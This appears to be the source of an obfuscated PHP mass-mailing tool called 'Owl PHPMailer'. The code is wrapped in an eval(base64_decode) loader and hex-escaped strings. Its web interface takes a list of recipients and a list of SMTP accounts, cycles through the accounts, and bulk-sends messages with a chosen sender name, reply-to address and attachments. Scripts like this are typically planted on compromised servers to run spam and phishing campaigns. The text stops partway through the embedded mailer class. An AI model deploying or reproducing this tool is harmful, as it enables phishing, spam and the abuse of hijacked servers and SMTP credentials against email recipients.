<?php eval(base64_decode('
 goto IBtEW; YIR25: echo $owl["\x77\145\142\163\x69\164\145"]; goto BQjaO; sBqBq: ?>
</title>
  <link href="https://maxcdn.bootstrapcdn.com/bootswatch/3.3.6/cosmo/bootstrap.min.css" rel="stylesheet">
  <link href="https://owlmailer.io/css/bootstrap-3.3.1.min.css" rel="stylesheet">
  <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
  <link rel="icon" href="https://owlmailer.io/img/favicon.ico" type="image/x-icon" />


</head>

<body>
    <script>
        var running = false;
        var request;
    </script>

  <script>
    Array.prototype.randomElement = function () {
  return this[Math.floor(Math.random() * this.length)]
 }

 function stopSending()
 {
    running = false;

    if (request) {
        request.abort();
      }

    $("#btnStart").attr("disabled", false);
    $("#btnStop").attr("disabled", true);
 }

 function handleSendingResponse(recipient, response, processedCount, totalEmailCount) {
  $("#progress").append('<div class="col-lg-3">' + processedCount.toString() + '/' + totalEmailCount.toString() + '</div><div class="col-lg-6">' + recipient + '</div>');
  
  if (response == "OK"){
    $("#progress").append('<div class="col-lg-1"><span class="label label-success">Ok</span></div>');
  }
  else if(response == "Incorrect Email"){
    $("#progress").append('<div class="col-lg-1"><span class="label label-default">Incorrect Email</span></div>');
  } else {
    $("#progress").append('<div class="col-lg-1"><span class="label label-default">' + response + '</span></div>');
  }
  $("#progress").append('<br>');
 }

 function startSending() {

 

  var eMailTextArea = document.getElementById("emailList");
  var eMailTextAreaLines = eMailTextArea.value.split("\n");
  var smtpAccountsTextArea = document.getElementById("smtpAccounts");
  var smtpAccountsTextAreaLines = smtpAccountsTextArea.value.split("\n");
  var encodingTypeE = document.getElementById('encoding');
  var encodingType = encodingTypeE.options[encodingTypeE.selectedIndex].value;
  var emailPriorityE = document.getElementById('priority');
  var emailPriority = emailPriorityE.options[emailPriorityE.selectedIndex].value;
 
   var form_data = new FormData();
   form_data.append("action", "send");
   form_data.append("sendingMethod", document.querySelector('input[name="sendingMethod"]:checked').value);
   form_data.append("senderEmail", document.getElementById('senderEmail').value);
   form_data.append("senderName", document.getElementById('senderName').value);
   form_data.append("replyTo", document.getElementById('replyTo').value);
   form_data.append("messageSubject", document.getElementById('subject').value);
   form_data.append("messageLetter", document.getElementById('messageLetter').value);
   form_data.append("altMessageLetter", document.getElementById('altMessageLetter').value);
   form_data.append("messageType", document.querySelector('input[name="messageType"]:checked').value);
   form_data.append("encodingType", encodingType);
   form_data.append("emailPriority", emailPriority);

   for (var x = 0; x < document.getElementById('attachment').files.length; x++) {
      form_data.append("attachment[]", document.getElementById('attachment').files[x]);
   }

  $("#progress").empty();
  var processedCount = 0;
  $(function () {
    var i = 0;
    running = true;

    $("#btnStart").attr("disabled", true);
    $("#btnStop").attr("disabled", false);


    function nextCall() {
      if (i == eMailTextAreaLines.length){

         $("#btnStart").attr("disabled", false);
         $("#btnStop").attr("disabled", true);
         return; //last call was last item in the array
      }

      // Abort any pending request
      if (request) {
        request.abort();
      }
       if(!running)
      {
        return;
      }

      var recipient = eMailTextAreaLines[i++]
      form_data.set("recipient", recipient);
      var smtpAccount = smtpAccountsTextAreaLines[i % smtpAccountsTextAreaLines.length];
      form_data.set("smtpAcct", smtpAccount);

      
      request = $.ajax({
        type: "post",
        data: form_data,
        contentType: false,
        processData: false,
      });
      // Callback handler that will be called on success
      request.done(function (response, textStatus, jqXHR) {
        processedCount += 1;
        handleSendingResponse(recipient, response, processedCount, eMailTextAreaLines.length);
        nextCall();
      });
    }
    nextCall();
  });
 }
</script>
  <div class="container col-lg-6">
    <h3>&#129417; Owl PHPMailer<small> <?php  goto sxS5D; PgI_k: class PHPMailer { const CHARSET_ISO88591 = "\x69\x73\x6f\55\70\70\x35\x39\x2d\61"; const CHARSET_UTF8 = "\x75\x74\x66\55\x38"; const CONTENT_TYPE_PLAINTEXT = "\164\x65\170\164\57\x70\x6c\x61\x69\x6e"; const CONTENT_TYPE_TEXT_CALENDAR = "\164\145\x78\x74\57\x63\141\x6c\x65\x6e\x64\141\x72"; const CONTENT_TYPE_TEXT_HTML = "\164\x65\170\164\x2f\150\164\155\x6c"; const CONTENT_TYPE_MULTIPART_ALTERNATIVE = "\x6d\165\x6c\x74\x69\160\141\x72\164\x2f\141\154\164\145\162\x6e\x61\x74\x69\x76\145"; const CONTENT_TYPE_MULTIPART_MIXED = "\x6d\165\154\164\151\x70\x61\162\164\x2f\x6d\151\170\x65\144"; const CONTENT_TYPE_MULTIPART_RELATED = "\x6d\x75\154\x74\x69\160\x61\162\164\57\x72\x65\x6c\x61\x74\x65\144"; const ENCODING_7BIT = "\67\142\151\164"; const ENCODING_8BIT = "\70\x62\x69\164"; const ENCODING_BASE64 = "\x62\x61\x73\145\66\64"; const ENCODING_BINARY = "\142\x69\x6e\x61\162\x79"; const ENCODING_QUOTED_PRINTABLE = "\x71\x75\157\164\145\x64\55\160\162\x69\156\x74\x61\x62\154\x65"; public $Priority; public $CharSet = self::CHARSET_ISO88591; public $ContentType = self::CONTENT_TYPE_PLAINTEXT; public $Encoding = self::ENCODING_8BIT; public $ErrorInfo = ''; public $From = "\162\157\157\x74\100\154\157\x63\141\154\x68\157\x73\x74"; public $FromName = "\122\x6f\157\x74\x20\125\163\x65\162"; public $Sender = ''; public $Subject = ''; public $Body = ''; public $AltBody = ''; public $Ical = ''; protected $MIMEBody = ''; protected $MIMEHeader = ''; protected $mailHeader = ''; public $WordWrap = 0; public $Mailer = "\x6d\141\151\154"; public $Sendmail = "\57\165\163\x72\57\163\x62\x69\x6e\x2f\163\145\156\144\155\x61\151\154"; public $UseSendmailOptions = true; public $ConfirmReadingTo = ''; public $Hostname = ''; public $MessageID = ''; public $MessageDate = ''; public $Host = "\x6c\157\x63\141\x6c\x68\157\163\x74"; public $Port = 25; public $Helo = ''; public $SMTPSecure = ''; public $SMTPAutoTLS = true; public $SMTPAuth = false; public $SMTPOptions = array(); public $Username = ''; public $Password = ''; public $AuthType = ''; protected $oauth; public $Timeout = 300; public $dsn = ''; public $SMTPDebug = 0; public $Debugoutput = "\145\143\x68\157"; public $SMTPKeepAlive = false; public $SingleTo = false; protected $SingleToArray = array(); public $do_verp = false; public $AllowEmpty = false; public $DKIM_selector = ''; public $DKIM_identity = ''; public $DKIM_passphrase = ''; public $DKIM_domain = ''; public $DKIM_copyHeaderFields = true; public $DKIM_extraHeaders = array(); public $DKIM_private = ''; public $DKIM_private_string = ''; public $action_function = ''; public $XMailer = ''; public static $validator = "\160\150\x70"; protected $smtp; protected $to = array(); protected $cc = array(); protected $bcc = array(); protected $ReplyTo = array(); protected $all_recipients = array(); protected $RecipientsQueue = array(); protected $ReplyToQueue = array(); protected $attachment = array(); protected $CustomHeader = array(); protected $lastMessageID = ''; protected $message_type = ''; protected $boundary = array(); protected $language = array(); protected $error_count = 0; protected $sign_cert_file = ''; protected $sign_key_file = ''; protected $sign_extracerts_file = ''; protected $sign_key_pass = ''; protected $exceptions = false; protected $uniqueid = ''; const VERSION = "\66\x2e\60\x2e\x37"; const STOP_MESSAGE = 0; const STOP_CONTINUE = 1; const STOP_CRITICAL = 2; protected static $LE = "\xd\12"; const MAX_LINE_LENGTH = 998; const STD_LINE_LENGTH = 76; public function __construct($exceptions = null) { if (null !== $exceptions) { $this->exceptions = (bool) $exceptions; } $this->Debugoutput = strpos(PHP_SAPI, "\x63\154\151") !== false ? "\145\143\x68\157" : "\150\x74\x6d\154"; } public function __destruct() { $this->smtpClose(); } private function mailPassthru($to, $subject, $body, $header, $params) { if (ini_get("\155\142\x73\164\162\x69\x6e\147\56\x66\165\156\143\137\157\166\145\x72\154\x6f\x61\144") & 1) { $subject = $this->secureHeader($subject); } else { $subject = $this->encodeHeader($this->secureHeader($subject)); } if (!$this->UseSendmailOptions or null === $params) { $result = @mail($to, $subject, $body, $header); } else { $result = @mail($to, $subject, $body, $header, $params); } return $result; } protected function edebug($str) { if ($this->SMTPDebug <= 0) { return; } if ($this->Debugoutput instanceof \Psr\Log\LoggerInterface) { $this->Debugoutput->debug($str); return; } if (!in_array($this->Debugoutput, array("\x65\x72\162\x6f\162\137\x6c\x6f\147", "\150\x74\155\x6c", "\x65\143\x68\157")) and is_callable($this->Debugoutput)) { call_user_func($this->Debugoutput, $str, $this->SMTPDebug); return; } switch ($this->Debugoutput) { case "\x65\162\162\157\162\137\154\x6f\147": error_log($str); break; case "\x68\164\x6d\154": echo htmlentities(preg_replace("\57\133\134\x72\134\156\135\x2b\57", '', $str), ENT_QUOTES, "\x55\124\x46\x2d\x38"), "\74\142\162\x3e\12"; break; case "\x65\143\x68\157": default: $str = preg_replace("\57\x5c\x72\x5c\156\x7c\134\162\57\x6d\163", "\12", $str); echo gmdate("\131\55\x6d\x2d\144\x20\x48\x3a\x69\72\163"), "\11", trim(str_replace("\xa", "\xa\40\x20\x20\40\40\x20\x20\x20\x20\x20\x20\x20\x20\x20\40\x20\x20\40\x20\x9\x20\40\x20\40\x20\40\x20\40\x20\40\40\x20\40\40\40\40\x20\x20", trim($str))), "\12"; } } public function isHTML($isHtml = true) { if ($isHtml) { $this->ContentType = static::CONTENT_TYPE_TEXT_HTML; } else { $this->ContentType = static::CONTENT_TYPE_PLAINTEXT; } } public function isSMTP() { $this->Mailer = "\x73\x6d\x74\160"; } public function isMail() { $this->Mailer = "\x6d\141\151\x6c"; } public function isSendmail() { $ini_sendmail_path = ini_get("\x73\145\156\x64\x6d\x61\x69\154\137\160\x61\164\x68"); if (false === stripos($ini_sendmail_path, "\x73\145\x6e\144\x6d\141\x69\154")) { $this->Sendmail = "\x2f\x75\x73\162\57\x73\x62\151\156\57\163\145\156\x64\x6d\x61\x69\x6c"; } else { $this->Sendmail = $ini_sendmail_path; } $this->Mailer = "\x73\x65\156\144\x6d\x61\151\154"; } public function isQmail() { $ini_sendmail_path = ini_get("\x73\x65\x6e\x64\155\x61\x69\154\137\160\141\x74\150"); if (false === stripos($ini_sendmail_path, "\161\x6d\141\x69\x6c")) { $this->Sendmail = "\x2f\166\141\162\x2f\161\155\141\151\x6c\57\142\151\x6e\57\161\x6d\141\151\x6c\x2d\x69\x6e\152\145\143\164"; } else { $this->Sendmail = $ini_sendmail_path; } $this->Mailer = "\161\x6d\x61\151\x6c"; } public function addAddress($address, $name = '') { return $this->addOrEnqueueAnAddress("\x74\157", $address, $name); } public function addCC($address, $name = '') { return $this->addOrEnqueueAnAddress("\143\143", $address, $name); } public function addBCC($address, $name = '') { return $this->addOrEnqueueAnAddress("\142\x63\x63", $address, $name); } public function addReplyTo($address, $name = '') { return $this->addOrEnqueueAnAddress("\x52\145\160\x6c\x79\55\124\157", $address, $name); } protected function addOrEnqueueAnAddress($kind, $address, $name) { $address = trim($address); $name = trim(preg_replace("\57\133\134\162\x5c\x6e\x5d\53\x2f", '', $name)); $pos = strrpos($address, "\100"); if (false === $pos) { $error_message = sprintf("\x25\x73\x20\50\45\x73\x29\x3a\40\x25\163", $this->lang("\x69\x6e\166\x61\154\151\144\137\141\x64\144\x72\145\163\x73"), $kind, $address); $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new Exception($error_message); } return false; } $params = array($kind, $address, $name); if ($this->has8bitChars(substr($address, ++$pos)) and static::idnSupported()) { if ("\122\145\x70\154\171\55\124\157" != $kind) { if (!array_key_exists($address, $this->RecipientsQueue)) { $this->RecipientsQueue[$address] = $params; return true; } } else { if (!array_key_exists($address, $this->ReplyToQueue)) { $this->ReplyToQueue[$address] = $params; return true; } } return false; } return call_user_func_array(array($this, "\x61\144\144\x41\156\x41\x64\144\x72\145\163\x73"), $params); } protected function addAnAddress($kind, $address, $name = '') { if (!in_array($kind, array("\164\157", "\143\x63", "\x62\143\x63", "\x52\145\160\x6c\171\x2d\x54\157"))) { $error_message = sprintf("\x25\163\x3a\40\x25\x73", $this->lang("\111\156\x76\141\154\151\x64\x20\162\x65\x63\x69\x70\151\145\156\164\x20\153\x69\x6e\x64"), $kind); $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new Exception($error_message); } return false; } if (!static::validateAddress($address)) { $error_message = sprintf("\x25\x73\x20\x28\45\x73\x29\x3a\40\45\x73", $this->lang("\151\x6e\x76\141\x6c\x69\144\x5f\x61\x64\x64\162\145\x73\163"), $kind, $address); $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new Exception($error_message); } return false; } if ("\x52\145\160\x6c\171\55\124\x6f" != $kind) { if (!array_key_exists(strtolower($address), $this->all_recipients)) { $this->{$kind}[] = array($address, $name); $this->all_recipients[strtolower($address)] = true; return true; } } else { if (!array_key_exists(strtolower($address), $this->ReplyTo)) { $this->ReplyTo[strtolower($address)] = array($address, $name); return true; } } return false; } public static function parseAddresses($addrstr, $useimap = true) { $addresses = array(); if ($useimap and function_exists("\x69\155\x61\160\x5f\x72\x66\143\x38\x32\x32\137\x70\141\x72\x73\145\x5f\x61\144\162\x6c\151\163\x74")) { $list = imap_rfc822_parse_adrlist($addrstr, ''); foreach ($list as $address) { if ("\x2e\x53\x59\116\x54\101\130\x2d\105\122\x52\117\122\x2e" != $address->host) { if (static::validateAddress($address->mailbox . "\x40" . $address->host)) { $addresses[] = array("\x6e\x61\155\145" => property_exists($address, "\160\x65\162\x73\x6f\x6e\141\154") ? $address->personal : '', "\141\x64\144\x72\x65\163\163" => $address->mailbox . "\100" . $address->host); } } } } else { $list = explode("\x2c", $addrstr); foreach ($list as $address) { $address = trim($address); if (strpos($address, "\74") === false) { if (static::validateAddress($address)) { $addresses[] = array("\x6e\x61\155\x65" => '', "\141\144\144\x72\x65\163\x73" => $address); } } else { list($name, $email) = explode("\x3c", $address); $email = trim(str_replace("\76", '', $email)); if (static::validateAddress($email)) { $addresses[] = array("\x6e\x61\155\x65" => trim(str_replace(array("\x22", "\x27"), '', $name)), "\141\x64\x64\162\145\163\163" => $email); } } } } return $addresses; } public function setFrom($address, $name = '', $auto = true) { $address = trim($address); $name = trim(preg_replace("\57\x5b\134\162\134\x6e\x5d\x2b\57", '', $name)); $pos = strrpos($address, "\x40"); if (false === $pos or (!$this->has8bitChars(substr($address, ++$pos)) or !static::idnSupported()) and !static::validateAddress($address)) { $error_message = sprintf("\45\163\x20\50\x46\162\x6f\x6d\51\x3a\x20\x25\x73", $this->lang("\151\x6e\166\x61\154\x69\x64\137\141\144\144\162\x65\x73\x73"), $address); $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new Exception($error_message); } return false; } $this->From = $address; $this->FromName = $name; if ($auto) { if (empty($this->Sender)) { $this->Sender = $address; } } return true; } public function getLastMessageID() { return $this->lastMessageID; } public static function validateAddress($address, $patternselect = null) { if (null === $patternselect) { $patternselect = static::$validator; } if (is_callable($patternselect)) { return call_user_func($patternselect, $address); } if (strpos($address, "\12") !== false or strpos($address, "\15") !== false) { return false; } switch ($patternselect) { case "\160\x63\x72\145": case "\x70\x63\162\x65\70": return (bool) preg_match("\57\x5e\50\x3f\41\x28\77\x3e\x28\x3f\x31\x29\x22\77\x28\x3f\x3e\134\134\133\40\55\x7e\x5d\x7c\133\x5e\x22\135\x29\x22\77\x28\77\61\x29\x29\173\x32\65\65\x2c\x7d\x29\x28\77\41\x28\77\x3e\50\77\x31\x29\x22\x3f\x28\77\76\134\x5c\133\x20\55\176\x5d\x7c\x5b\x5e\42\135\51\42\77\50\x3f\x31\x29\x29\x7b\x36\x35\x2c\175\x40\51" . "\x28\50\x3f\x3e\50\x3f\76\x28\x3f\76\50\50\77\76\x28\77\x3e\x28\77\x3e\134\x78\60\x44\x5c\170\60\x41\51\x3f\x5b\134\164\x20\x5d\x29\x2b\174\50\x3f\x3e\x5b\x5c\x74\x20\135\x2a\134\170\60\104\x5c\x78\x30\101\x29\77\x5b\134\x74\x20\135\53\51\77\51\50\x5c\50\x28\x3f\x3e\50\77\62\51" . "\50\77\x3e\x5b\x5c\x78\60\x31\55\x5c\170\60\x38\x5c\x78\60\102\x5c\x78\60\x43\134\170\60\x45\x2d\47\52\x2d\x5c\x5b\x5c\x5d\55\134\170\x37\106\135\174\x5c\134\133\134\170\60\x30\x2d\134\170\67\106\135\174\50\x3f\63\51\51\51\52\50\x3f\62\x29\134\51\x29\x29\53\x28\77\x32\51\x29\x7c\x28\77\62\x29\51\77\51" . "\50\x5b\x21\x23\55\47\52\x2b\134\57\55\71\x3d\x3f\136\x2d\x7e\55\x5d\x2b\x7c\x22\50\x3f\x3e\50\x3f\62\51\50\77\76\133\134\x78\60\x31\55\x5c\x78\60\70\134\x78\x30\102\x5c\170\x30\103\134\170\x30\x45\x2d\41\x23\55\134\x5b\x5c\135\x2d\134\170\67\x46\x5d\174\134\x5c\x5b\x5c\170\x30\60\x2d\134\170\x37\x46\135\51\x29\x2a" . "\x28\77\x32\x29\x22\51\50\77\76\50\77\x31\51\134\x2e\x28\x3f\x31\x29\x28\77\x34\51\x29\x2a\50\77\61\x29\100\50\x3f\x21\x28\77\x31\x29\133\x61\x2d\172\60\x2d\71\x2d\x5d\173\66\x34\x2c\175\51\50\77\x31\x29\50\x3f\x3e\x28\133\141\55\172\60\55\71\x5d\x28\x3f\76\133\141\x2d\x7a\60\55\x39\x2d\x5d\x2a\133\x61\x2d\172\60\x2d\71\135\51\77\51" . "\50\77\76\x28\77\x31\51\134\x2e\50\x3f\x21\x28\x3f\x31\51\133\141\55\x7a\x30\55\x39\x2d\x5d\x7b\x36\x34\54\175\51\50\x3f\61\x29\x28\77\65\x29\x29\173\x30\x2c\61\62\x36\175\x7c\x5c\133\50\77\72\50\x3f\76\111\x50\x76\66\72\x28\77\76\x28\133\141\55\146\60\x2d\71\x5d\173\61\x2c\x34\x7d\51\x28\77\x3e\x3a\50\77\x36\51\x29\173\x37\175" . "\x7c\50\77\41\x28\77\72\x2e\x2a\x5b\141\55\x66\x30\55\x39\135\x5b\x3a\x5c\135\x5d\x29\x7b\70\54\x7d\51\x28\50\x3f\66\x29\x28\77\76\72\50\x3f\x36\x29\51\173\60\54\66\x7d\x29\77\72\x3a\x28\x3f\67\51\77\51\51\x7c\x28\77\x3e\50\x3f\x3e\x49\120\166\x36\x3a\50\77\76\50\77\x36\x29\50\x3f\x3e\72\x28\77\x36\51\51\x7b\x35\175\x3a" . "\174\50\x3f\41\50\77\x3a\56\x2a\133\141\55\x66\60\55\x39\135\x3a\51\173\x36\54\175\x29\x28\77\x38\x29\x3f\x3a\72\50\77\76\x28\x28\x3f\66\51\50\x3f\x3e\x3a\x28\x3f\66\51\x29\x7b\60\x2c\64\x7d\51\72\x29\77\x29\51\77\x28\62\65\x5b\x30\55\x35\135\x7c\x32\133\60\x2d\64\x5d\133\x30\x2d\71\x5d\174\61\x5b\60\x2d\71\135\173\62\x7d" . "\x7c\133\61\55\71\135\77\x5b\60\x2d\71\135\51\50\x3f\76\x5c\x2e\50\x3f\x39\51\51\173\63\x7d\x29\x29\x5c\135\x29\x28\x3f\61\51\x24\57\x69\x73\x44", $address); case "\x68\164\x6d\154\65": return (bool) preg_match("\x2f\136\133\141\x2d\x7a\x41\x2d\x5a\60\55\x39\56\x21\x23\44\45\46\47\52\53\x5c\x2f\x3d\x3f\136\137\140\x7b\x7c\175\176\x2d\x5d\53\x40\x5b\141\x2d\172\x41\x2d\x5a\x30\55\71\x5d\x28\77\72\133\x61\55\x7a\x41\x2d\x5a\60\x2d\x39\55\x5d\173\x30\x2c\66\x31\175" . "\x5b\x61\55\x7a\x41\55\x5a\60\x2d\71\135\x29\77\x28\x3f\x3a\x5c\x2e\133\141\55\172\101\55\132\60\55\x39\135\50\x3f\72\133\141\x2d\172\x41\x2d\x5a\60\x2d\71\55\135\173\60\x2c\x36\x31\x7d\133\141\x2d\x7a\101\55\132\x30\x2d\x39\135\x29\x3f\51\52\x24\x2f\x73\104", $address); case "\160\x68\x70": default: return (bool) filter_var($address, FILTER_VALIDATE_EMAIL); } } public static function idnSupported() { return function_exists("\x69\144\156\x5f\x74\x6f\137\141\163\143\151\x69") and function_exists("\155\x62\137\x63\x6f\156\x76\x65\x72\164\137\x65\x6e\143\x6f\144\x69\x6e\147"); } public function punyencodeAddress($address) { $pos = strrpos($address, "\x40"); if (static::idnSupported() and !empty($this->CharSet) and false !== $pos) { $domain = substr($address, ++$pos); if ($this->has8bitChars($domain) and @mb_check_encoding($domain, $this->CharSet)) { $domain = mb_convert_encoding($domain, "\x55\x54\106\x2d\70", $this->CharSet); $errorcode = 0; $punycode = idn_to_ascii($domain, $errorcode, INTL_IDNA_VARIANT_UTS46); if (false !== $punycode) { return substr($address, 0, $pos) . $punycode; } } } return $address; } public function send() { try { if (!$this->preSend()) { return false; } return $this->postSend(); } catch (Exception $exc) { $this->mailHeader = ''; $this->setError($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } } public function preSend() { if ("\163\155\x74\160" == $this->Mailer or "\x6d\141\x69\154" == $this->Mailer and stripos(PHP_OS, "\127\x49\116") === 0) { static::setLE("\15\xa"); } else { static::setLE(PHP_EOL); } if (ini_get("\x6d\141\151\154\x2e\x61\144\144\x5f\170\137\150\x65\x61\144\x65\162") == 1 and "\x6d\141\x69\154" == $this->Mailer and stripos(PHP_OS, "\x57\111\x4e") === 0 and (version_compare(PHP_VERSION, "\67\56\60\56\x30", "\x3e\75") and version_compare(PHP_VERSION, "\x37\x2e\x30\56\x31\x37", "\x3c") or version_compare(PHP_VERSION, "\67\56\61\56\60", "\76\75") and version_compare(PHP_VERSION, "\x37\56\x31\56\63", "\74"))) { trigger_error("\x59\x6f\165\x72\40\x76\145\x72\x73\151\157\x6e\40\157\146\40\x50\x48\x50\x20\151\163\40\141\x66\x66\x65\x63\x74\145\x64\x20\x62\171\40\141\40\142\165\147\40\164\x68\141\x74\40\155\x61\x79\40\x72\x65\163\165\x6c\164\x20\x69\156\40\143\x6f\162\x72\x75\x70\x74\145\x64\x20\x6d\x65\x73\x73\141\x67\145\163\x2e" . "\40\x54\157\40\146\x69\x78\x20\151\164\x2c\40\163\167\151\164\x63\150\x20\x74\157\x20\163\145\x6e\x64\x69\x6e\147\40\165\163\151\x6e\147\40\123\x4d\x54\120\x2c\40\x64\151\x73\141\142\x6c\x65\40\x74\150\x65\x20\x6d\x61\151\154\56\141\144\144\x5f\x78\x5f\x68\x65\x61\144\145\162\x20\157\x70\164\151\157\156\x20\x69\x6e" . "\40\171\157\x75\162\x20\160\x68\x70\56\x69\x6e\151\x2c\40\x73\167\151\164\143\x68\40\x74\x6f\x20\115\x61\x63\117\123\x20\x6f\x72\x20\114\151\x6e\x75\x78\x2c\40\157\162\x20\165\x70\147\x72\141\144\145\40\x79\x6f\165\162\40\x50\110\x50\x20\164\157\40\x76\145\162\163\x69\157\156\x20\67\56\x30\x2e\x31\x37\53\x20\x6f\x72\40\67\x2e\61\56\x33\53\56", E_USER_WARNING); } try { $this->error_count = 0; $this->mailHeader = ''; foreach (array_merge($this->RecipientsQueue, $this->ReplyToQueue) as $params) { $params[1] = $this->punyencodeAddress($params[1]); call_user_func_array(array($this, "\141\144\x64\101\x6e\101\x64\144\162\x65\x73\163"), $params); } if (count($this->to) + count($this->cc) + count($this->bcc) < 1) { throw new Exception($this->lang("\160\162\x6f\x76\x69\144\145\x5f\x61\x64\144\x72\x65\x73\x73"), self::STOP_CRITICAL); } foreach (array("\x46\162\x6f\x6d", "\x53\x65\x6e\144\145\x72", "\x43\x6f\x6e\146\151\x72\x6d\x52\x65\141\x64\x69\156\x67\124\157") as $address_kind) { $this->{$address_kind} = trim($this->{$address_kind}); if (empty($this->{$address_kind})) { continue; } $this->{$address_kind} = $this->punyencodeAddress($this->{$address_kind}); if (!static::validateAddress($this->{$address_kind})) { $error_message = sprintf("\x25\x73\x20\x28\x25\x73\x29\72\x20\45\163", $this->lang("\151\x6e\166\x61\x6c\151\x64\137\x61\144\144\162\145\163\163"), $address_kind, $this->{$address_kind}); $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new Exception($error_message); } return false; } } if ($this->alternativeExists()) { $this->ContentType = static::CONTENT_TYPE_MULTIPART_ALTERNATIVE; } $this->setMessageType(); if (!$this->AllowEmpty and empty($this->Body)) { throw new Exception($this->lang("\x65\x6d\x70\x74\x79\137\155\x65\163\x73\x61\x67\145"), self::STOP_CRITICAL); } $this->Subject = trim($this->Subject); $this->MIMEHeader = ''; $this->MIMEBody = $this->createBody(); $tempheaders = $this->MIMEHeader; $this->MIMEHeader = $this->createHeader(); $this->MIMEHeader .= $tempheaders; if ("\x6d\x61\151\x6c" == $this->Mailer) { if (count($this->to) > 0) { $this->mailHeader .= $this->addrAppend("\x54\x6f", $this->to); } else { $this->mailHeader .= $this->headerLine("\124\157", "\x75\156\x64\151\x73\x63\x6c\157\x73\145\144\x2d\162\x65\143\x69\x70\151\145\x6e\164\163\72\x3b"); } $this->mailHeader .= $this->headerLine("\x53\x75\x62\x6a\145\143\164", $this->encodeHeader($this->secureHeader($this->Subject))); } if (!empty($this->DKIM_domain) and !empty($this->DKIM_selector) and (!empty($this->DKIM_private_string) or !empty($this->DKIM_private) and static::isPermittedPath($this->DKIM_private) and file_exists($this->DKIM_private))) { $header_dkim = $this->DKIM_Add($this->MIMEHeader . $this->mailHeader, $this->encodeHeader($this->secureHeader($this->Subject)), $this->MIMEBody); $this->MIMEHeader = rtrim($this->MIMEHeader, "\15\12\x20") . static::$LE . static::normalizeBreaks($header_dkim) . static::$LE; } return true; } catch (Exception $exc) { $this->setError($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } } public function postSend() { try { switch ($this->Mailer) { case "\x73\145\x6e\x64\155\141\151\154": case "\161\155\x61\151\154": return $this->sendmailSend($this->MIMEHeader, $this->MIMEBody); case "\x73\155\x74\160": return $this->smtpSend($this->MIMEHeader, $this->MIMEBody); case "\x6d\141\151\154": return $this->mailSend($this->MIMEHeader, $this->MIMEBody); default: $sendMethod = $this->Mailer . "\123\145\x6e\144"; if (method_exists($this, $sendMethod)) { return $this->{$sendMethod}($this->MIMEHeader, $this->MIMEBody); } return $this->mailSend($this->MIMEHeader, $this->MIMEBody); } } catch (Exception $exc) { $this->setError($exc->getMessage()); $this->edebug($exc->getMessage()); if ($this->exceptions) { throw $exc; } } return false; } protected function sendmailSend($header, $body) { if (!empty($this->Sender) and self::isShellSafe($this->Sender)) { if ("\161\x6d\x61\151\x6c" == $this->Mailer) { $sendmailFmt = "\45\163\40\55\x66\x25\x73"; } else { $sendmailFmt = "\x25\163\40\55\x6f\151\40\55\146\45\x73\40\x2d\164"; } } else { if ("\161\x6d\141\151\154" == $this->Mailer) { $sendmailFmt = "\45\163"; } else { $sendmailFmt = "\45\x73\40\x2d\157\x69\x20\x2d\164"; } } $sendmail = sprintf($sendmailFmt, escapeshellcmd($this->Sendmail), $this->Sender); if ($this->SingleTo) { foreach ($this->SingleToArray as $toAddr) { $mail = @popen($sendmail, "\x77"); if (!$mail) { throw new Exception($this->lang("\145\x78\x65\143\x75\x74\145") . $this->Sendmail, self::STOP_CRITICAL); } fwrite($mail, "\x54\157\x3a\40" . $toAddr . "\12"); fwrite($mail, $header); fwrite($mail, $body); $result = pclose($mail); $this->doCallback($result == 0, array($toAddr), $this->cc, $this->bcc, $this->Subject, $body, $this->From, array()); if (0 !== $result) { throw new Exception($this->lang("\x65\x78\145\x63\x75\x74\145") . $this->Sendmail, self::STOP_CRITICAL); } } } else { $mail = @popen($sendmail, "\167"); if (!$mail) { throw new Exception($this->lang("\145\170\145\143\165\164\145") . $this->Sendmail, self::STOP_CRITICAL); } fwrite($mail, $header); fwrite($mail, $body); $result = pclose($mail); $this->doCallback($result == 0, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From, array()); if (0 !== $result) { throw new Exception($this->lang("\145\x78\145\x63\x75\x74\145") . $this->Sendmail, self::STOP_CRITICAL); } } return true; } protected static function isShellSafe($string) { if (escapeshellcmd($string) !== $string or !in_array(escapeshellarg($string), array("\x27{$string}\47", "\x22{$string}\x22"))) { return false; } $length = strlen($string); for ($i = 0; $i < $length; ++$i) { $c = $string[$i]; if (!ctype_alnum($c) && strpos("\x40\x5f\x2d\x2e", $c) === false) { return false; } } return true; } protected static function isPermittedPath($path) { return !preg_match("\x23\136\133\141\x2d\172\135\x2b\x3a\x2f\x2f\x23\151", $path); } protected function mailSend($header, $body) { $toArr = array(); foreach ($this->to as $toaddr) { $toArr[] = $this->addrFormat($toaddr); } $to = implode("\x2c\40", $toArr); $params = null; if (!empty($this->Sender) and static::validateAddress($this->Sender)) { if (self::isShellSafe($this->Sender)) { $params = sprintf("\55\146\45\163", $this->Sender); } } if (!empty($this->Sender) and static::validateAddress($this->Sender)) { $old_from = ini_get("\x73\x65\156\144\x6d\x61\151\x6c\x5f\146\x72\x6f\x6d"); ini_set("\x73\145\156\x64\x6d\x61\x69\x6c\x5f\x66\x72\x6f\155", $this->Sender); } $result = false; if ($this->SingleTo and count($toArr) > 1) { foreach ($toArr as $toAddr) { $result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params); $this->doCallback($result, array($toAddr), $this->cc, $this->bcc, $this->Subject, $body, $this->From, array()); } } else { $result = $this->mailPassthru($to, $this->Subject, $body, $header, $params); $this->doCallback($result, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From, array()); } if (isset($old_from)) { ini_set("\163\x65\x6e\144\x6d\141\x69\x6c\137\x66\162\157\155", $old_from); } if (!$result) { throw new Exception($this->lang("\x69\x6e\163\x74\141\156\164\151\x61\x74\145"), self::STOP_CRITICAL); } return true; } public function getSMTPInstance() { if (!is_object($this->smtp)) { $this->smtp = new SMTP(); } return 